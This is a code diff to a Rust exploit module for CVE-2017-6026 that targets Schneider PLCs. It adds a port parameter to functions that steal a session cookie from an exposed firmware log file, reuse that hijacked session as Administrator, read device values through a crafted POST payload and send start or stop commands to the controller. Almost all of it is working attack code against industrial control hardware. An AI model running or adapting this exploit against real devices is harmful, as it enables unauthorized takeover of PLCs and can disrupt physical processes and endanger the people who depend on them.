@@ -17,9 +17,10 @@ pub struct SchneiderDeviceInfo {
     pub cookie: String,
 }
 
-/// Retrieve the session cookie from the FwLog.txt (CVE-2017-6026).
-pub fn get_session_cookie(target_ip: &str) -> Option<SchneiderSession> {
-    let url = format!("http://{target_ip}/usr/Syslog/FwLog.txt");
+/// Retrieve the session cookie from the FwLog.txt (CVE-2017-6026). Pass `port = 0` for default (80).
+pub fn get_session_cookie(target_ip: &str, port: u16) -> Option<SchneiderSession> {
+    let effective_port = if port == 0 { 80 } else { port };
+    let url = format!("http://{target_ip}:{effective_port}/usr/Syslog/FwLog.txt");
     let agent = ureq::AgentBuilder::new()
         .timeout_connect(Duration::from_secs(10))
         .timeout_read(Duration::from_secs(10))
@@ -67,13 +68,15 @@ pub fn get_session_cookie(target_ip: &str) -> Option<SchneiderSession> {
     })
 }
 
-/// Use the hijacked session to get device info.
+/// Use the hijacked session to get device info. Pass `port = 0` for default (80).
 pub fn get_device_info(
     target_ip: &str,
+    port: u16,
     cookie_value: &str,
     username: &str,
 ) -> Option<SchneiderDeviceInfo> {
-    let url = format!("http://{target_ip}/plcExchange/getValues/");
+    let effective_port = if port == 0 { 80 } else { port };
+    let url = format!("http://{target_ip}:{effective_port}/plcExchange/getValues/");
     let post_data = "S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;";
 
     let agent = ureq::AgentBuilder::new()
@@ -136,9 +139,10 @@ pub fn get_device_info(
     None
 }
 
-/// Send start or stop command via hijacked session.
+/// Send start or stop command via hijacked session. Pass `port = 0` for default (80).
 pub fn control_plc(
     target_ip: &str,
+    port: u16,
     cookie_value: &str,
     username: &str,
     action: &str,
@@ -154,8 +158,9 @@ pub fn control_plc(
             return false;
         }
     };
+    let effective_port = if port == 0 { 80 } else { port };
     let cookie = format!("M258_LOG={username}:{cookie_value}");
-    let url = format!("http://{target_ip}/plcExchange/command/{safe_action}");
+    let url = format!("http://{target_ip}:{effective_port}/plcExchange/command/{safe_action}");
     let agent = ureq::AgentBuilder::new()
         .timeout_connect(Duration::from_secs(10))
         .timeout_read(Duration::from_secs(10))
@@ -173,11 +178,11 @@ pub fn control_plc(
     }
 }
 
-/// Run the full CVE-2017-6026 exploit chain.
-pub fn exploit(target_ip: &str) -> Option<SchneiderDeviceInfo> {
-    let session = get_session_cookie(target_ip)?;
+/// Run the full CVE-2017-6026 exploit chain. Pass `port = 0` for default (80).
+pub fn exploit(target_ip: &str, port: u16) -> Option<SchneiderDeviceInfo> {
+    let session = get_session_cookie(target_ip, port)?;
     println!("Booted {} times", session.power_on_count);
     println!("Cookie: {} ({})", session.cookie_value, session.bootup_time);
     println!("---");
-    get_device_info(target_ip, &session.cookie_value, "Administrator")
+    get_device_info(target_ip, port, &session.cookie_value, "Administrator")
 }
